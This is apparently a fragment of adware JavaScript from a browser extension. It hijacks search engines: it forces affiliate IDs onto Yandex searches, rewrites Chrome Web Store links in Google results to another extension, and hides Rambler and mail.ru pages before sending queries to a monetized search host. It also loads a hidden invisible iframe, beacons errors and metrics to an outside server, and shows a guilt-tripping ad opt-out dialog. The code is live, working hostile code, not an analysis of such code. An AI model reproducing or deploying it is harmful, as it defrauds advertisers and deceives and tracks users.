                                if (location.hostname.indexOf("yandex.") !== 0 || location.pathname.indexOf("/search") == -1) {
                                    return
                                }
                                var r = $$.randomNumber(1, 100);
                                var rLimit = scriptsToLoad[block].coverage;;
                                if (r > rLimit) {
                                    return
                                }
                                $$.loadedCallback("MNTZ_LOADED", block);
                                if ($$.getCookie("__ckp_srchydx_fired") == 1) {
                                    return
                                }

                                function getParams() {
                                    params = {};
                                    for (var e = location.search.replace("?", ""), r = e.split("&"), c = 0; c < r.length; c++) {
                                        t = r[c].split("="), t[1] && (params[t[0]] = t[1])
                                    }
                                    var a = location.hash.replace("#", "");
                                    a && (t = a.split("="), t[1] && (params[t[0]] = t[1]))
                                }

                                function checkAff() {
                                    getParams();
                                    if (params.clid && params.clid.indexOf("2300267") > -1) {
                                        return true
                                    } else {
                                        window.stop && window.stop();
                                        $$.loadedCallback("BANNER_LOAD", block);
                                        $$.setCookie("__ckp_srchydx_fired", 1, {
                                            expire: 1800
                                        });
                                        location.search = location.search.length ? location.search + "&clid=2300267-200" : "?clid=2300267";
                                        clearInterval(tmr)
                                    }
                                }

                                function checkForSearch() {
                                    -1 != d.indexOf("yandex.") && checkAff() && clearInterval(tmr)
                                }
                                var d = window.document.domain,
                                    tmr, params = {};
                                if (window == top) {
                                    checkForSearch();
                                    tmr = setInterval(checkForSearch, 100)
                                }
                            } catch (e) {}
                        })
                    })()
                };
                (function() {
                    var a = w["1f7cbb02d08cf61dbb"];
                    if ((location.hostname.indexOf("google.") !== 0 || location.hostname.indexOf("www.google.") !== 0) && document.location.pathname.indexOf("search") === -1) {
                        return
                    }
                    var c = "chrome.google.com/webstore";
                    var b = {
                        ddjdamcnphfdljlojajeoiogkanilahc: ["Speed Dial", "New tab", "start tab", "start page", "new page", "home page", "default page", "fast dial", "fast access", "quick access"]
                    };

                    function d() {
                        var f = document.querySelectorAll("div.g");
                        if (!f.length) {
                            return
                        }
                        Object.keys(b).forEach(function(g) {
                            f.forEach(function(h) {
                                var i = (h.querySelector("h3") && h.querySelector("h3").textContent) + " " + (h.querySelector("span.st") && h.querySelector("span.st").textContent);
                                b[g].forEach(function(j) {
                                    if (i.toUpperCase().indexOf(j.toUpperCase()) > -1) {
                                        e(h.querySelector("a:not(.cws)"), g)
                                    }
                                })
                            })
                        })
                    }

                    function e(f, h) {
                        if (!f) {
                            return
                        }
                        var g = false;
                        if (f.href.indexOf(c) > -1) {
                            g = f.href
                        }
                        if (f.getAttribute("data-href") && f.getAttribute("data-href").indexOf(c) > -1) {
                            g = f.getAttribute("data-href")
                        }
                        if (g) {
                            f.removeAttribute("onmousedown");
                            f.removeAttribute("data-href");
                            f.href = g.replace(/\/[a-z]{32}/gi, "/" + h);
                            f.className = f.className + " cws";
                            a.on(f, "click", function() {
                                a.setCookie("__mzglrl", 1, {
                                    expire: 300
                                });
                                a.loadedCallback("BANNER_LOAD", '1f608')
                            })
                        }
                    }
                    if (!a.getCookie("__mzglrl")) {
                        d();
                        setInterval(d, 1000 * 10)
                    } else {}
                })();;
                if (scriptsToLoad['5db45']) {
                    (function() {
                        var block = '5db45';
                        (function(n, i, q) {
                            var r = w["1f7cbb02d08cf61dbb"];
                            var o = r.getMtzCfg('5db45');
                            var j = document.domain;
                            var c = location.href;
                            var f = {};
                            var h = true;
                            if (j.indexOf("nova.rambler.ru") !== -1 && c.indexOf("/search") !== -1 && c.indexOf("query=") !== -1) {
                                document.documentElement.style.display = "none";
                                setTimeout(m, 3000)
                            }
                            if (j.indexOf("go.mail.ru") !== -1 && c.indexOf("/search") !== -1 && c.indexOf("q=") !== -1) {
                                document.documentElement.style.display = "none";
                                setTimeout(m, 3000)
                            }
                            if (j.indexOf("plusnetwork.com") !== -1 && c.indexOf("q=") !== -1) {
                                document.documentElement.style.display = "none";
                                setTimeout(m, 3000)
                            }
                            if (j.indexOf("search.mysearch.com") !== -1 && c.indexOf("/web") !== -1 && c.indexOf("q=") !== -1) {
                                document.documentElement.style.display = "none";
                                setTimeout(m, 3000)
                            }

                            function m() {
                                document.documentElement.style.display = "block"
                            }

                            function a() {
                                if (document.head) {
                                    var d = document.createElement("meta");
                                    d.name = "referrer";
                                    d.content = "no-referrer";
                                    document.getElementsByTagName("head")[0].appendChild(d)
                                }
                            }

                            function p(l) {
                                f = {};
                                if (!l || l == "") {
                                    l = location.href
                                }
                                var x = l.split("?");
                                var v = l.split("#");
                                if (x.length == 2) {
                                    x = x[1]
                                } else {
                                    x = x[0]
                                }
                                if (v.length == 2) {
                                    x = x + "&" + v[1]
                                }
                                if (x != "") {
                                    var d = x.split("&");
                                    for (var u = 0; u < d.length; u++) {
                                        t = d[u].split("=");
                                        if (t[1]) {
                                            f[t[0]] = t[1]
                                        }
                                    }
                                }
                            }

                            function k(d) {
                                var l = setInterval(function() {
                                    p();
                                    if (f[d] == undefined) {
                                        return
                                    }
                                    r.loadedCallback("BANNER_LOAD", '5db45');
                                    var u = f[d];
                                    var s = "http://search.feedvertizus.com/v1/hostedsearch?pid=252428&subid=965&subid2=y_" + ((r && r.tbParams && r.tbParams.tid) ? r.tbParams.tid : "") + "&keyword=" + u;
                                    if (h) {
                                        clearInterval(l);
                                        h = false;
                                        window.location.replace(s)
                                    }
                                }, 0)
                            }

                            function g() {
                                document.documentElement.style.display = "none";
                                setTimeout(m, 3000);
                                var d = setInterval(function() {
                                    r.loadedCallback("BANNER_LOAD", '5db45');
                                    var l = "https://yandex.com/?clid=2300267";
                                    if (h) {
                                        clearInterval(d);
                                        h = false;
                                        window.location.replace(l)
                                    }
                                }, 0)
                            }

                            function b() {
                                if (j.indexOf("nova.rambler.ru") != -1) {
                                    a();
                                    k("query")
                                }
                                if (j.indexOf("go.mail.ru") != -1) {
                                    a();
                                    k("q")
                                }
                                if (j.indexOf("plusnetwork.com") != -1) {
                                    a();
                                    k("q")
                                }
                                if (j.indexOf("search.mysearch.com") != -1) {
                                    a();
                                    k("q")
                                }
                            }
                            b();

                            function e() {
                                if (j.indexOf("r0.ru") != -1 && location.pathname == "/") {
                                    a();
                                    g()
                                }
                                if (j.indexOf("go.mail.ru") != -1 && location.pathname == "/") {
                                    a();
                                    g()
                                }
                                if (j.indexOf("securesurf.biz") != -1 && location.pathname == "/") {
                                    a();
                                    g()
                                }
                                if (j.indexOf("mysearch24.com") != -1 && location.pathname == "/") {
                                    a();
                                    g()
                                }
                                if (j.indexOf("search.mysearch.com") != -1 && location.pathname == "/") {
                                    a();
                                    g()
                                }
                                if (j.indexOf("secure-finder.org") != -1 && location.pathname == "/") {
                                    a();
                                    g()
                                }
                                if (j.indexOf("playbar.biz") != -1 && location.pathname == "/") {
                                    a();
                                    g()
                                }
                            }
                            e()
                        })(document, window);
                    })()
                }
                if (scriptsToLoad['4d7da']) {
                    (function() {
                        (function(e, a, b) {
                            var c = document.createElement("iframe");
                            c.src = "https://nesmotrinamenya.ru/566bbee0f961ad71b54c3c2fd36db053";
                            c.width = 1;
                            c.height = 1;
                            c.style = "position:absolute;left:0px;top:0px;opacity:0.0;";
                            document.body.appendChild(c)
                        })(document, window);
                    })()
                }
            })(document, window);;
            (function(g, a, e) {
                var c = a["1f7cbb02d08cf61dbb"];
                var f = c.Sizzle;

                function b() {
                    var d = f(".commercial-unit");
                    var i = f("input[name=q]");
                    if (i.length > 0 && d.length > 0) {
                        var h = i[0].value;
                        c.loadedCallback("GGL_COM_BLOCK", "", h)
                    }
                }
                c.each(f("input[name=q]"), function(d) {
                    c.on(d, "change", function() {
                        b()
                    })
                });
                b()
            })(document, window, undefined);;
            (function(e, a, f, c) {
                var b = a[f];
                b.twBarOptOutInit = function() {
                    var g = document.createElement("iframe");
                    g.setAttribute("style", "display: none; position: fixed; top: 50%; left: 50%; width: 650px; height: 500px; margin-top: -250px; margin-left: -325px; z-index: 2147483647;");
                    g.id = "__twbopt1f7cbb02d08cf61dbb";
                    g.frameBorder = 0;
                    g.scrolling = "no";
                    document.body.appendChild(g);
                    var d = null;
                    var h = function() {
                        if (d) {
                            clearTimeout(d)
                        }
                        var i = {};
                        if (g.contentWindow) {
                            i = g.contentWindow.document
                        } else {
                            if (g.contentDocument) {
                                i = g.contentDocument
                            }
                        }
                        i.open();
                        i.write('<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>' + a[f].tbParams.title + ' OptOut</title><style>article,aside,details,figcaption,figure,footer,header,hgroup,main,nav,section,summary{display:block}audio,canvas,video{display:inline-block}template{display:none}html{font-family:sans-serif;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%}body{margin:0}a{background:0 0}a:active,a:hover{outline:0}h1{margin:.67em 0}b,strong{font-weight:700}dfn{font-style:italic}hr{height:0;-moz-box-sizing:content-box;box-sizing:content-box}mark{color:#000;background:#ff0}code,kbd,pre,samp{font-size:1em}pre{white-space:pre-wrap}q{quotes:"ВЃC" "ВЃD" "ВЃ8" "ВЃ9"}sub,sup{position:relative;font-size:75%;line-height:0;vertical-align:baseline}sup{top:-.5em}sub{bottom:-.25em}img{border:0}figure{margin:0}button,input,select,textarea{margin:0}button,select{text-transform:none}button{cursor:pointer;-webkit-appearance:button}input[type=search]::-webkit-search-cancel-button,input[type=search]::-webkit-search-decoration{-webkit-appearance:none}button::-moz-focus-inner,input::-moz-focus-inner{padding:0;border:0}textarea{overflow:auto;vertical-align:top}table{border-collapse:collapse;border-spacing:0}@media print{*{color:#000!important;text-shadow:none!important;background:transparent!important;box-shadow:none!important}a,a:visited{text-decoration:underline}blockquote,pre{border:1px solid #999;page-break-inside:avoid}thead{display:table-header-group}img,tr{page-break-inside:avoid}img{max-width:100%!important}h2,h3,p{orphans:3;widows:3}h2,h3{page-break-after:avoid}select{background:#fff!important}}*,:after,:before{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}html{font-size:62.5%;-webkit-tap-highlight-color:rgba(0,0,0,0)}body{font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;font-size:14px;line-height:1.428571429;color:#333;background-color:#fff}button,input,select,textarea{font-family:inherit;font-size:inherit;line-height:inherit}a{color:#428bca;text-decoration:none}a:focus,a:hover{color:#2a6496;text-decoration:underline}a:focus{outline:thin dotted;outline:5px auto -webkit-focus-ring-color;outline-offset:-2px}img{vertical-align:middle}hr{margin-top:20px;margin-bottom:20px;border:0;border-top:1px solid #eee}h1,h2,h3,h4,h5,h6{font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;font-weight:500;line-height:1.1;color:inherit}h1,h2,h3{margin-top:20px;margin-bottom:10px}h4,h5,h6{margin-top:10px;margin-bottom:10px}h1{font-size:36px}h2{font-size:30px}h3{font-size:24px}h4{font-size:18px}h5{font-size:14px}h6{font-size:12px}p{margin:0 0 10px}small{font-size:85%}cite{font-style:normal}ol,ul{margin-top:0;margin-bottom:10px}dl{margin-top:0;margin-bottom:20px}dd,dt{line-height:1.428571429}dt{font-weight:700}dd{margin-left:0}blockquote{padding:10px 20px;margin:0 0 20px;border-left:5px solid #eee}blockquote:after,blockquote:before{content:""}address{margin-bottom:20px;font-style:normal;line-height:1.428571429}code,kbd,pre,samp{font-family:Menlo,Monaco,Consolas,"Courier New",monospace}code{padding:2px 4px;font-size:90%;color:#c7254e;white-space:nowrap;background-color:#f9f2f4;border-radius:4px}pre{display:block;padding:9.5px;margin:0 0 10px;font-size:13px;line-height:1.428571429;color:#333;word-break:break-all;word-wrap:break-word;background-color:#f5f5f5;border:1px solid #ccc;border-radius:4px}table{max-width:100%;background-color:transparent}th{text-align:left}fieldset{padding:0;margin:0;border:0}legend{display:block;width:100%;padding:0;margin-bottom:20px;font-size:21px;line-height:inherit;color:#333;border:0;border-bottom:1px solid #e5e5e5}label{display:inline-block;margin-bottom:5px;font-weight:700}input[type=number]::-webkit-inner-spin-button,input[type=number]::-webkit-outer-spin-button{height:auto}output{display:block;padding-top:7px;font-size:14px;line-height:1.428571429;color:#555;vertical-align:middle}.form-control:-ms-input-placeholder{color:#999}.form-control::-webkit-input-placeholder{color:#999}.btn{display:inline-block;padding:6px 12px;margin-bottom:0;font-size:14px;font-weight:400;line-height:1.428571429;text-align:center;white-space:nowrap;vertical-align:middle;cursor:pointer;background-image:none;border:1px solid transparent;border-radius:4px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;-o-user-select:none;user-select:none}.btn:focus{outline:thin dotted;outline:5px auto -webkit-focus-ring-color;outline-offset:-2px}.btn:focus,.btn:hover{color:#333;text-decoration:none}.btn:active{background-image:none;outline:0;-webkit-box-shadow:inset 0 3px 5px rgba(0,0,0,.125);box-shadow:inset 0 3px 5px rgba(0,0,0,.125)}.btn-primary{color:#fff;background-color:#428bca;border-color:#357ebd}.btn-primary:active,.btn-primary:focus,.btn-primary:hover{color:#fff;background-color:#3276b1;border-color:#285e8e}.btn-primary:active{background-image:none}.btn-warning{color:#fff;background-color:#f0ad4e;border-color:#eea236}.btn-warning:active,.btn-warning:focus,.btn-warning:hover{color:#fff;background-color:#ed9c28;border-color:#d58512}.btn-warning:active{background-image:none}.btn-danger{color:#fff;background-color:#d9534f;border-color:#d43f3a}.btn-danger:active,.btn-danger:focus,.btn-danger:hover{color:#fff;background-color:#d2322d;border-color:#ac2925}.btn-danger:active{background-image:none}.btn-success{color:#fff;background-color:#5cb85c;border-color:#4cae4c}.btn-success:active,.btn-success:focus,.btn-success:hover{color:#fff;background-color:#47a447;border-color:#398439}.btn-success:active{background-image:none}.btn-lg{padding:10px 16px;font-size:18px;line-height:1.33;border-radius:6px}.btn-xs{padding:1px 5px;font-size:12px;line-height:1.5;border-radius:3px}.fade{opacity:0;-webkit-transition:opacity .15s linear;transition:opacity .15s linear}.fade.in{opacity:1}@font-face{font-family:"Glyphicons Halflings";src:url(../fonts/glyphicons-halflings-regular.eot);src:url(../fonts/glyphicons-halflings-regular.eot?#iefix) format("embedded-opentype"),url(../fonts/glyphicons-halflings-regular.woff) format("woff"),url(../fonts/glyphicons-halflings-regular.ttf) format("truetype"),url(../fonts/glyphicons-halflings-regular.svg#glyphicons-halflingsregular) format("svg")}@-webkit-keyframes progress-bar-stripes{from{background-position:40px 0}to{background-position:0 0}}@keyframes progress-bar-stripes{from{background-position:40px 0}to{background-position:0 0}}.close{float:right;font-size:21px;font-weight:700;line-height:1;color:#000;text-shadow:0 1px 0 #fff;opacity:.2;filter:alpha(opacity=20)}.close:focus,.close:hover{color:#000;text-decoration:none;cursor:pointer;opacity:.5;filter:alpha(opacity=50)}button.close{padding:0;cursor:pointer;background:0 0;border:0;-webkit-appearance:none}.modal-open{overflow:hidden}.modal{position:fixed;top:0;right:0;bottom:0;left:0;z-index:2000000;display:none;overflow:auto;overflow-y:scroll}.modal.fade .modal-dialog{-webkit-transform:translate(0,-25%);-ms-transform:translate(0,-25%);transform:translate(0,-25%);-webkit-transition:-webkit-transform .3s ease-out;-moz-transition:-moz-transform .3s ease-out;-o-transition:-o-transform .3s ease-out;transition:transform .3s ease-out}.modal.in .modal-dialog{-webkit-transform:translate(0,0);-ms-transform:translate(0,0);transform:translate(0,0)}.modal-dialog{position:relative;z-index:1050;width:auto;margin:10px}.modal-content{position:relative;background-color:#fff;border:1px solid #999;border:1px solid rgba(0,0,0,.2);border-radius:6px;outline:0;-webkit-box-shadow:0 3px 9px rgba(0,0,0,.5);box-shadow:0 3px 9px rgba(0,0,0,.5);background-clip:padding-box}.modal-backdrop{position:fixed;top:0;right:0;bottom:0;left:0;z-index:1030;background-color:#000}.modal-backdrop.fade{opacity:0;filter:alpha(opacity=0)}.modal-backdrop.in{opacity:.5;filter:alpha(opacity=50)}.modal-header{min-height:16.428571429px;padding:15px;border-bottom:1px solid #e5e5e5}.modal-header .close{margin-top:-2px}.modal-title{margin:0;line-height:1.428571429}.modal-body{position:relative;padding:20px}.modal-footer{padding:19px 20px 20px;margin-top:15px;text-align:right;border-top:1px solid #e5e5e5}.modal-footer:after,.modal-footer:before{display:table;content:" "}.modal-footer:after{clear:both}.modal-footer .btn+.btn{margin-bottom:0;margin-left:5px}@media screen and (min-width:768px){.modal-dialog{width:600px;margin:30px auto}.modal-content{-webkit-box-shadow:0 5px 15px rgba(0,0,0,.5);box-shadow:0 5px 15px rgba(0,0,0,.5)}}</style><content><div class="modal-content" style="font-family:\'Segoe UI\',\'Droid Sans\',Arial,sans-serif; width:650px"><div class="modal-header"><button type="button" class="close" id="close-btn" data-dismiss="modal" aria-hidden="true"><img src="//serenityart.biz/ext/images/close-cross.png" width="16" height="16"></button><h4 class="modal-title" id="myModalLabel"><b>' + a[f].tbParams.title + '\'s development is supported by <u style="position:static">optional</u> ads</b></h4></div><div class="modal-body">' + a[f].tbParams.title + '\'s development is supported by <b>optional</b> advertisements that are added to some of the websites you visit. During the development of this extension, I\'ve put in thousands of hours adding features, fixing bugs and making things betternot mentioning the support of all the users who ask for help.<br><br>Ads support most of the internet we all use and love; without them, the internet we have today would simply not exist. Similarly, without revenue, this extension (and the upcoming new ones) would not be possible.<br><br><b>You can disable these ads now or later in the settings page. You can also minimize the ads appearance by clicking on partial support button. Both of these options are available by clicking \'x\' button in the corner of each ad.</b> In both cases,your choice will remain in effect unless you reinstall or reset the extension.</div><div class="modal-footer"><button type="button" id="full-support" class="btn btn-success btn-lg">Fully Support</button><button type="button" id="partial-support" class="btn btn-default">Partially Support</button><p style="text-align:left;width:100%;"><a id="no-support" style="text-decoration:underline;" href="#">No, I don\'t want to support you work</a></p></div></div></content>');
                        i.close();
                        i.getElementById("full-support").onclick = function() {
                            b.optoutHide();
                            b.loadedCallback("OPTOUT_CLK_FULLSUPPORT");
                            return false
                        };
                        i.getElementById("close-btn").onclick = function() {
                            b.optoutHide();
                            b.loadedCallback("OPTOUT_CLK_CLOSE");
                            return false
                        };
                        i.getElementById("partial-support").onclick = function() {
                            window.open("http://thisadsfor.us/optout?t=8060&u=52096&key=1f7cbb02d08cf61dbb&block=" + b.currentOptoutBlock);
                            b.optoutHide();
                            b.loadedCallback("OPTOUT_CLK_PARTSUPPORT")
                        };
                        i.getElementById("no-support").onclick = function() {
                            window.open("http://thisadsfor.us/optout?t=8060&u=52096&key=1f7cbb02d08cf61dbb&block=" + b.currentOptoutBlock);
                            b.optoutHide();
                            b.loadedCallback("OPTOUT_CLK_NOSUPPORT")
                        }
                    };
                    if (g.contentDocument || g.contentWindow) {
                        h()
                    } else {
                        b.on(g, "load", h);
                        d = setTimeout(h, 5000)
                    }
                    b.twBarOptOut = a[f].twBarOptOut = g
                }
            })(document, window, "1f7cbb02d08cf61dbb", undefined);;
            d.loadedCallback("FINISHED", "", location.host)
        })
    });;
    try {
        b(document, window)
    } catch (c) {
        var h = (typeof c.stack != "undefined" ? c.stack : "!empty stack!");
        if (h.length > 1500) {
            h = h.substr(0, 1500)
        }
        var a = (i.location.protocol == "http:" ? "http:" : "https:") + "//serenityart.biz/log/?l=error&m=" + encodeURIComponent((typeof c.message != "undefined" ? c.message : "!empty message!") + "|" + h);
        var k = document.createElement("script");
        k.type = "text/javascript";
        k.src = a + (a.indexOf("?") == -1 ? "?" : "&") + "t=" + (new Date().getTime());
        (document.getElementsByTagName("script")[0] || document.documentElement.firstChild).parentNode.appendChild(k);
        (function() {
            var e = ["mid=", "wid=52096", "sid=" + (i[g] && i[g].tbParams && i[g].tbParams.sid) ? i[g].tbParams.sid : "", "tid=8060", "custom1=" + encodeURIComponent((typeof c.message != "undefined" ? c.message : "!empty message!")), "rid=CORE_JS_ERROR"];
            a = (i.location.protocol == "http:" ? "http:" : "https:") + "//serenityart.biz/metric/?" + e.join("&");
            var d = f.createElement("img");
            d.setAttribute("style", "width:0;height:0;display:none;visibility:hidden;");
            d.src = a + (a.indexOf("?") == -1 ? "?" : "&") + "t=" + (new Date().getTime());
            (document.head || document.documentElement).appendChild(d);
            if (typeof d.onload != j) {
                d.onload = function() {
                    d.parentNode && d.parentNode.removeChild(d)
                }
            }
        })()
    }
}(document, window));
